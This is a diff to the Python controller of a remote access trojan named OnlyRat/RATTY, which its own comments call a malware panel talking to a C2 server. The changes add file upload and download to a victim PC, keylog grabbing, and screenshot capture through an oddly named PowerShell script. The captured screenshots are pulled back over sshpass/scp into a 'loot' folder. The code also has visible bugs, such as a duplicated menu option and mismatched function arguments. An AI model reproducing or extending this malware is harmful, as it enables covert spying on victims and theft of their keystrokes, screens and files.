@@ -26,8 +26,10 @@ def random_text():
 
 # get from the username
 username=os.environ["USER"]
+print(username)
 header=f"[~] {username}@ratty $ "
 remote_path="raw.githubusercontent.com/carlocarlo123/RATTY/main"
+local_path=f"/home/{username}/Desktop"
 # create a hidden folder for our malwaRE PANEL
 local_path="/home/kali/Desktop/Malware development/OnlyRat"
 help_menu="""
@@ -48,6 +50,8 @@ options_menu="""
                     [2] Grab keylogs
                     [3] Install Screenshot
                     [4] Grab Screenshots
+                    [5] upload File
+                    [6] download File
                     [5] Restart Target PC
 """
 # read the config file
@@ -78,12 +82,14 @@ def connect(address,password):
 
 def remote_uplaod(address,password,upload_file,path):
     # remote 
-    os.system(f"sshpass -p {password} scp -r onlyrat@{address}:{upload_file} {path}")
+    os.system(f"sshpass -p  \"{password}\" scp {upload_file} onlyrat@{address}:{local_path}")
 
 
 def remote_download(address,password,download_file,path):
     # remote 
-    os.system(f'sshpass -p \"{password}\" scp -r  onlyrat@{address}:{download_file} {path}')
+    print("\n[*] Starting Download.....")
+    os.system("mkdir ~/Download")
+    os.system(f"sshpass -p \"{password}\" scp -r  onlyrat@{address}:{path} ~/Downloads")
 
 # remotely commands
 def remote_commands(address,password,command):
@@ -167,26 +173,37 @@ def Install_ScreenShot(address,password,username,working):
 # get current date and time
 def current_time():
     current=dt.now()
-    return current.strftime("%d/%m/%Y_%H-%M-%S")   
+    return current.strftime("%d/%m/%Y_%H-%M-%S")
 
-def Grab_ScreenShot(address,password,username,working,path):
+def Grab_ScreenShot(address,password,working,username):
     # make the command to take the screenshot
     print("[*] Taking the screenshot.........")
-    take_screenshot_command=f'cd {working} && powershell powershell.exe .\\UEsQRWCLHV.ps1'
+    take_screenshot_command=f'cd {working} && mkdir ASGHbvcQPW && powershell powershell.exe .\\UEsQRWCLHV.ps1 > ASGHbvcQPW'
     remote_commands(address, password, take_screenshot_command)
-    print("\n[*] screenshot taken successfully\n")
-    # send the screensot the c2 
-    print("[*] Grabing the screenshot.........")
-    screenshot_location=f" cd {working} && mkdir 'ASGHbvcQPW' "
-    print(screenshot_location)
-    remote_commands(address, password,screenshot_location)
-    remote_download(address, password, screenshot_location,path)
-    print("[*] sending Photos to C2 server......")
-    file_name=current_time()
-    os.system(f" sudo mkdir ~/Downloads/{username}")
-    rename_screenshot=f"mv ~/Downloads/ASGHbvcQPW/*  ~/Downloads/{username}"
-    os.system(rename_screenshot)
-    print("\n[*] screenshot renamed successfully on your  PC and its located in ~/Downloads/{username} \n")
+
+    print("\n[*] screenshot taken successfully AND SAVED TO ASGHbvcQPW FOLDER\n")
+    screenshot_location=f"{working}/ASGHbvcQPW"
+    remote_download(address, password,screenshot_location)
+    print(f"[*] screenshots downloaded successfully")
+
+    print("[*] Formating screenshots.........")
+    loot_folder=f"screenshots-{username}-{current_time()}"
+    os.system(f"mkdir ~/Downloads/{loot_folder}")
+    os.system(f"mv ~/Downloads/ASGHbvcQPW/* ~/Downloads/{loot_folder}")
+    os.system(f"rm -rf ~/Downloads/ASGHbvcQPW")
+    print("\n[*] screenshot renamed successfully on your  PC and its located in ~/Downloads \n")
+
+def upload(address,password,wokring):
+
+    print("\n[~] Enter file you wish to upload")
+    upload_file=input(header)
+
+    print("[*] uploading ...........")
+    remote_uplaod(address, password, upload_file, working)
+    print("[+} uploaded successfully........")
+
+
+
 
 
 def update():
@@ -275,7 +292,9 @@ def cli(argument):
             except Exception as e:
                 pass
         elif option=="4":
-            Grab_ScreenShot(ipv4,password,target_username,working_directory,'~/Downloads')
+            Grab_ScreenShot(ipv4,password,target_username,working_directory)
+        elif option=="5":
+            upload(ipv4,password,working_directory)
         elif option=="5":
             remote_commands(ipv4, password, "shutdown /r")
     else:
